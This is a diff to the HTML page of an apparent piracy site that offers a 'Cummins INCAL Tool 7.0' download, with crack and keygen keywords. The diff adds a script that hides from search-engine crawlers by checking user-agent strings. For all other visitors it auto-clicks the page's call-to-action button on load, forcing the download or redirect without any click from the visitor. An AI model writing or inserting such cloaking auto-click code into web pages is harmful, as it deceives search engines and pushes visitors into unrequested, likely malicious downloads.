@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Cummins INCAL Tool 7.0</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Cummins INCAL Tool 7.0 to unpack and repack ECM calibration files using INSITE. Free, 50 GB, unlimited license">
     <meta name="keywords" content="Cummins INCAL Tool 7.0, Cummins INCAL Tool download, Cummins INCAL Tool 7.0 free download, Cummins INCAL Tool 7.0 crack, Cummins INCAL Tool 7.0 keygen, Cummins INCAL Tool 2023, Cummins INCAL Tool download free, Cummins INCAL Tool v7, Cummins INCAL Tool v7 free download, Cummins INCAL Tool v7.0, Cummins INCAL Tool v7 crack, Cummins INCAL Tool v7 keygen, Cummins INSITE diagnostic software, Cummins INSITE software 8.7.3, Cummins INSITE software download, Cummins INSITE diagnostic software download, Cummins INSITE software crack, Cummins INSITE repackaging tool, Cummins INCAL to CAL conversion, Cummins calibration files tool, Cummins ECM file repacker, Cummins software 2023">
     <style>
